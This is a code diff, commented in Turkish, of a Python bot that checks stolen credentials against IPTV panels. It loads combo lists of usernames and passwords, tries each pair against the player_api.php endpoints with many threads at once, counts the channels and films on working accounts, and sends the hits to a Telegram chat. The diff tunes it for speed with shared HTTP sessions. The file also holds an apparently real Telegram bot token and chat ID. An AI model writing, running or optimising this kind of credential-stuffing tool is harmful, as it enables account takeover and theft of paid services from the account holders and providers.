@@ -15,7 +15,6 @@ app = Flask('')
 def home():
     return "IPTV Bot Aktif ve Hızlı (Multi-Thread) Modda Çalışıyor!"
 
-# --- TELEGRAM AYARLARI ---
 TOKEN = "9296501081:AAG8COydawvxX-TfAEArbG-SdEtliP6WODM"
 CHAT_ID = "-1003901042500"
 
@@ -38,10 +37,11 @@ HEADERd = {
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
-def m3u_tara_detayli(panel, user, pas):
+# Her thread için ayrı bir Session kullanarak soket tıkanıklığını önleyelim
+def m3u_tara_detayli(session, panel, user, pas):
     api_url = f"http://{panel}/player_api.php?username={user}&password={pas}"
     try:
-        res = requests.get(api_url, headers=HEADERd, timeout=4, verify=False)
+        res = session.get(api_url, headers=HEADERd, timeout=4, verify=False)
         if res.status_code == 200 and 'user_info' in res.text:
             veri = str(res.text)
             if '"auth":1' in veri or '"status":"Active"' in veri:
@@ -79,13 +79,13 @@ def m3u_tara_detayli(panel, user, pas):
 
                 kanalsayisi, filmsayisi, dizisayisi = "0", "0", "0"
                 try:
-                    k_res = requests.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_live_streams", timeout=2, verify=False)
+                    k_res = session.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_live_streams", timeout=2, verify=False)
                     kanalsayisi = str(k_res.text.count('stream_id'))
                     
-                    v_res = requests.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_vod_streams", timeout=2, verify=False)
+                    v_res = session.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_vod_streams", timeout=2, verify=False)
                     filmsayisi = str(v_res.text.count('stream_id'))
                     
-                    s_res = requests.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_series", timeout=2, verify=False)
+                    s_res = session.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_series", timeout=2, verify=False)
                     dizisayisi = str(s_res.text.count('series_id'))
                 except:
                     pass
@@ -114,14 +114,13 @@ def m3u_tara_detayli(panel, user, pas):
 def arka_plan_tarayici():
     print("[*] Bulut Otonom Hızlı Tarayıcı Başlatıldı...")
     time.sleep(2)
-    telegrama_gonder("🚀 <b>Hızlı Multi-Thread Tarayıcı Aktif!</b>\n⚡ Eşzamanlı tarama motoru devreye alındı.")
+    telegrama_gonder("🚀 <b>Hızlı Multi-Thread Tarayıcı Aktif!</b>\n⚡ Oturum yönetimi optimize edildi.")
     
     combo_dir = os.path.join(BASE_DIR, 'combo')
     panel_dir = os.path.join(BASE_DIR, 'panel_list')
     
     while True:
         try:
-            # Panelleri yükle
             paneller = []
             if os.path.exists(panel_dir):
                 for p_dosya in os.listdir(panel_dir):
@@ -136,7 +135,6 @@ def arka_plan_tarayici():
             if not paneller:
                 paneller = ["ornekpanel.com:8080"]
 
-            # Comboları tara ve panellerle eşleştir (Eşzamanlı / Multi-Thread)
             if os.path.exists(combo_dir):
                 for dosya_adi in os.listdir(combo_dir):
                     if dosya_adi.endswith('.txt'):
@@ -156,16 +154,16 @@ def arka_plan_tarayici():
 
                         print(f"[i] Toplam {len(combolar)} hesap, {len(paneller)} panel ile taranıyor...")
                         
-                        # ThreadPoolExecutor ile 30 iş parçacığı aynı anda çalışır
-                        with ThreadPoolExecutor(max_workers=30) as executor:
-                            futures = []
-                            for user, pas in combolar:
-                                for panel in paneller:
-                                    futures.append(executor.submit(m3u_tara_detayli, panel, user, pas))
-                            
-                            # Görevlerin tamamlanmasını bekle
-                            for future in as_completed(futures):
-                                pass
+                        # Thread havuzu ve paylaşımlı Session havuzu
+                        with ThreadPoolExecutor(max_workers=20) as executor:
+                            with requests.Session() as session:
+                                futures = [
+                                    executor.submit(m3u_tara_detayli, session, panel, user, pas)
+                                    for user, pas in combolar
+                                    for panel in paneller
+                                ]
+                                for future in as_completed(futures):
+                                    pass
         
             print("[i] Tarama turu tamamlandı, 10 dakika sonra tekrar dönecek...")
             time.sleep(600)
